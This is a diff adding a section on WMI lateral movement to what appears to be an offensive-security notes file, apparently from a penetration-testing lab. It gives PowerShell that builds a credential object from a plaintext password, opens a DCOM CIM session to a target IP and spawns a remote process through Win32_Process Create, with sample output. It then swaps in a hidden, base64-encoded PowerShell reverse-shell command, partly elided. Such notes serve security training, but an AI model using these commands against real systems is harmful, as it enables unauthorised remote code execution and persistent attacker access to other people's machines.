@@ -1062,6 +1062,51 @@ ReturnValue      : 0
 PSComputerName   :
 ```
 
+#### Lateral Movement from Windows using CimSession
+
+First, you need to create a PSCredential object that will store your session username and password.
+
+```powershell
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+```
+
+Now that you have your PSCredential object, you need to create a Common Information Model via the `New-CimSession` cmdlet.
+
+To do that, you will first specify DCOM as the protocol for the WMI session with the `New-CimSessionOption` cmdlet on the first line. On the second line, you'll create the new session, `New-Cimsession` against your target IP, using `-ComputerName` and supply the PSCredential object (`-Credential $credential`) along with the session options (`-SessionOption $Options`). Lastly, you'll define `calc` as the payload to be executed by WMI.
+
+```powershell
+$options = New-CimSessionOption -Protocol DCOM
+$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
+$command = 'calc';
+```
+
+As a final step, you need to tie together all the arguments you configured previously by issuing the `Invoke-CimMethod` cmdlet and supplying `Win32_Process` to the ClassName and `Create` to the MethodName. To send the argument, you wrap them in `@{CommandLine=$Command};`.
+
+```powershell
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+```
+
+Example:
+
+```powershell
+PS C:\Users\jeff> $username = 'jen';
+...
+PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+
+ProcessId ReturnValue PSComputerName
+--------- ----------- --------------
+     3712           0 192.168.50.73
+```
+
+For a reverse shell, you just have to switch the command:
+
+```powershell
+PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
+```
+
 #### Lateral Movement from Linux
 
 Interacting with WMI from a Linux system can be accomplished using various tools and libraries that support the WMI protocol. Below are some commonly used tools for this purpose. `wmic` is a command-line tool that allows you to interact with WMI from Linux. It provides a straightforward way to query and manage Windows systems. To install `wmic` you need to install the `wmi-client` package. On Debian-based systems, you can install it using the following commands:
